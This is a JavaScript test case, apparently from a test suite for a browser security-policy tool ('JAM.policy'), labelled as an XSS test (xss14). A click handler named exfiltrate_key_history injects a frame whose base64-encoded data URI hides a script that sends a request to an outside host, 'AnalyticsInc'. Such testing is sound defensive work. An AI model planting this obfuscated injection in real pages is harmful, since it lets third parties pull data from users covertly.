introspect(JAM.policy.pFull) {
function exfiltrate_key_history() {
  var script = document.createElement("frameset");
  var script2 = document.createElement("frame");
  script2.src = "data:text/html;charset=utf-8;base64,PHNjcmlwdD54bWxodHRwPW5ldyBYTUxIdHRwUmVxdWVzdCgpO3htbGh0dHAub3BlbigiR0VUIiwgImh0dHA6Ly9BbmFseXRpY3NJbmM6ODAwMC9zdWJtaXNzaW9uLmh0bWw/dGVzdD14c3MxNCIsIHRydWUpO3htbGh0dHAuc2VuZChudWxsKTs8L3NjcmlwdD4=";
  script.appendChild(script2);
  var v2 = document.getElementsByTagName("body");
  var v0 = v2[0];
  v0.appendChild(script);
  return
}
var v1 = document.getElementById("test");
v1.onclick = exfiltrate_key_history;

}
